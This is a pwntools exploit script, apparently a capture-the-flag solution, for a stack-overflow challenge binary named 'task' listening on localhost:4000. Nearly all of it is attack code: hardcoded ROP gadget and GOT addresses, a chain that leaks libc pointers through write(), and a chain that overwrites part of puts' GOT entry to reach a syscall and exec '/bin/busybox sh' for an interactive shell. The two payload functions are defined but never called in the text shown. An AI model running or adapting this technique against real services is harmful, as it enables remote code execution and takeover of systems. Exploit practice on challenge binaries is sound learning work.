#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template task --host localhost --port 4000
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'task')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 4000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        # return process([exe.path] + argv, env={"LD_PRELOAD": "./libc.so.6"}, *a, **kw)
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
task_base = 0x400000

pop_rbp = task_base + 0x11fd # : pop rbp ; ret
pop_rdi = task_base + 0x124e # : pop rdi ; ret
pop_rdx = task_base + 0x1252 # : pop rdx ; ret
pop_rsi = task_base + 0x1250 # : pop rsi ; ret

logo_data = task_base + 0x4080
hello_data = task_base + 0x5220


puts_plt = task_base + 0x10B0
fflush_plt = task_base + 0x1120
write_plt = task_base + 0x10c0
read_plt = task_base + 0x10E0
printf_plt = task_base + 0x10d0

puts_plt_got = task_base + 0x4018
srand_plt_got = task_base + 0x4038
time_plt_got = task_base + 0x4048

def call_v1(rip, rdi, rsi, rdx):
    return (
        pack(pop_rdi, 64) +
        pack(rdi, 64) +
        pack(pop_rsi, 64) +
        pack(rsi, 64) +
        pack(pop_rdx, 64) +
        pack(rdx, 64) +
        pack(rip, 64)
    )

io = start()


io.recvuntil(b'Enter your name: ')

# leak libc address
def leak_libc_addresses():
  io.sendline(
      b'A'*16 +
      b'S'*8 +
      call_v1(write_plt, 1, puts_plt_got, 8)+
      call_v1(write_plt, 1, srand_plt_got, 8) +
      call_v1(write_plt, 1, time_plt_got, 8)
  )
  io.recvuntil(b'Thank you!\n')
  for _ in range(3):
      received = io.recv(8)
      libc_base = unpack(received, 64)
      print("LIBC_FUNC", hex(libc_base))

def exec_sh():
  syscall_rop = 0xe4

  shell = (
          b'A'*16 +
          b'S'*8 +
          call_v1(read_plt, 0, puts_plt_got, 1) +
          call_v1(read_plt, 0, logo_data, 59) +
          call_v1(puts_plt, logo_data + 16, logo_data, 0)
      )

  print("ROP LENGTH", len(shell))

  io.send(shell + b'A'*(256-len(shell)))
  io.send(pack(syscall_rop, 8))
  cmd = pack(logo_data + 29, 64) + pack(0, 64) + b'/bin/busybox\x00' + b'sh\x00'
  io.send(cmd + b"\x00"* (59-len(cmd)))
  io.sendline(b'ls')

io.interactive()

